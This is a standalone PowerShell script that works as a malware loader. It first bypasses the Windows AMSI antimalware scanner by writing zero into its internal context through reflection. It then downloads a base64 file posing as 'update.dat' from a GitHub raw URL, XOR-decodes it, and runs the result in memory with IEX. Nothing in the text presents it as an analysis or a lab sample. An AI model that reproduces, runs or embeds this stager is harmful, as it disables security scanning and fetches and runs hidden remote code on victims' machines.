try{$t=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$b=[Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static;$f=$t.GetField("amsiContext",$b);$p=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($p,0)}catch{}
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$b64=(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Tokenairdrop527/update/main/update.dat').Trim()
$bytes=[Convert]::FromBase64String($b64)
IEX([Text.Encoding]::UTF8.GetString(($bytes|%{$_-bxor0xAE})))